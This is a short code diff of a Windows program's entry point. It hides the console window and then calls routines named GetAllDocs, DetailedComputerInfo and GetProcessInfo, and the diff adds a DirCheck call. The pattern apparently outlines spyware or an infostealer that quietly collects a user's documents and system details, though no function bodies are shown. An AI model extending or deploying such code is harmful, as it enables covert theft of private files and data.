@@ -7,6 +7,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 {
     HWND hWnd = GetConsoleWindow();
     ShowWindow(hWnd, SW_HIDE);
+    DirCheck();
     GetAllDocs();
     DetailedComputerInfo();
     GetProcessInfo();
